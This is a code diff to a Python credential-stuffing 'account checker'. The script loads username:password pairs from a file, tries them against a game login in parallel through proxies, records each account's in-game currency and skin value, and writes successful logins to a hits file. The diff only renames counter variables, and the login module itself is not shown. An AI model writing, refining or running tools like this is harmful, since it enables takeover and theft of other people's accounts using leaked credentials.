@@ -1,3 +1,4 @@
+
 import threading,os,random,time
 from concurrent.futures import ThreadPoolExecutor as TPE
 from auth import Auth
@@ -21,14 +22,14 @@ class K:
   global results_list
   u,p=a.strip().split(":",1);st=s.auth.cl(u,p,s)
   
-  with console.lock:
-   console.total_checked_accounts += 1
-   current_checked = console.total_checked_accounts
+  with console.lk:
+   console.tca += 1
+   current_checked = console.tca
   
   if st in["login_ok","needs_migrate"]:
    s.v+=1
-   with console.lock:
-    console.total_found_accounts += 1
+   with console.lk:
+    console.tfa += 1
    
    try:
     pr=s.gp()
@@ -46,8 +47,8 @@ class K:
      kr_amount = profile_stats['player_funds']
      inv_value = profile_stats['player_skinvalue']
      
-     with console.lock:
-      console.total_kr += kr_amount
+     with console.lk:
+      console.tkr += kr_amount
      console.iv2(level)
      console.iv1(inv_value)
      
@@ -63,16 +64,16 @@ class K:
     with open("results/hits.txt", "a", encoding="utf-8") as f:
      f.write(L + "\n")
   
-  console.print_stats()
+  console.ps()
 
 def main():
  a=LA()
  if not a:return print("No accounts found in data/accounts.txt")
  
- console.total_accounts = len(a)
- console.total_checked_accounts = 0
- console.total_found_accounts = 0
- console.total_kr = 0
+ console.ta = len(a)
+ console.tca = 0
+ console.tfa = 0
+ console.tkr = 0
  
  p=LP();t=input("threads (default: 100): ").strip()
  try:t=int(t);t=100 if t<=0 else t
@@ -89,5 +90,5 @@ def main():
  c=K();c.proxies=p
  with TPE(max_workers=t)as ex:ex.map(c.proc,a)
  
- console.print_stats(force_update=True)
+ console.ps(fu=True)
  print("CHECKING COMPLETED!")
